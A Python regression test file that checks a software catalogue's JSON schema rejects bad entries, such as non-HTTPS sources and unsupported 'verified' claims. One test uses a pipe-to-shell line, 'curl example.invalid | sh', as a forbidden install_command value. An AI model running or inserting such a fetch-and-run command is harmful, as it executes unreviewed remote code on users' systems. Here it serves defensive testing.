#!/usr/bin/env python3
"""Regression tests for catalogue metadata policy; never execute catalogue content."""
from __future__ import annotations

import json
import unittest
from pathlib import Path

from jsonschema import Draft202012Validator, FormatChecker

ROOT = Path(__file__).resolve().parents[2]
SCHEMA = json.loads((ROOT / "catalogue/schema/software-entry.schema.json").read_text(encoding="utf-8"))
SAMPLE = json.loads((ROOT / "catalogue/entries/sample-linux-tools.json").read_text(encoding="utf-8"))
VALIDATOR = Draft202012Validator(SCHEMA, format_checker=FormatChecker())


class CatalogueSchemaTests(unittest.TestCase):
    def test_sample_entry_is_valid(self):
        self.assertEqual(list(VALIDATOR.iter_errors(SAMPLE)), [])

    def test_rejects_non_https_source(self):
        entry = json.loads(json.dumps(SAMPLE))
        entry["source"]["url"] = "http://example.invalid/software"
        self.assertTrue(list(VALIDATOR.iter_errors(entry)))

    def test_rejects_unknown_executable_field(self):
        entry = json.loads(json.dumps(SAMPLE))
        entry["install_command"] = "curl example.invalid | sh"
        self.assertTrue(list(VALIDATOR.iter_errors(entry)))

    def test_rejects_unreviewed_entry_marked_verified_with_no_evidence(self):
        entry = json.loads(json.dumps(SAMPLE))
        entry["verification"]["status"] = "verified"
        entry["verification"].pop("evidence_url", None)
        self.assertTrue(list(VALIDATOR.iter_errors(entry)))

    def test_schema_rejects_unknown_platform(self):
        entry = json.loads(json.dumps(SAMPLE))
        entry["platforms"] = ["all-platforms-everywhere"]
        self.assertTrue(list(VALIDATOR.iter_errors(entry)))


if __name__ == "__main__":
    unittest.main(verbosity=2)
